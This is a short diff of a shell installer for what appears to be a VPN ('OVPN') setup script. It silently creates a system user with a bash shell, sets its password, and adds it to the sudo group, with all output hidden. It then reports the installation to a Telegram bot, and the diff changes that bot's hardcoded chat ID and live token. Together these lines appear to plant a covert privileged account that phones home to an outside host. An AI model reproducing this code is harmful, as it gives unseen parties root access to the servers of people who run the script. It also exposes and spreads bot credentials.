@@ -18,8 +18,8 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="6582195916"
-KEY="7123941357:AAGRvwO9SiZadggGnkpmDeS8XPf1mnP_iOw"
+CHATID="1328284490"
+KEY="6612780540:AAHC5VCL81C2NGzUBi3QeMac2b-FQW79Rcg"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installation VIP OVPN-Script
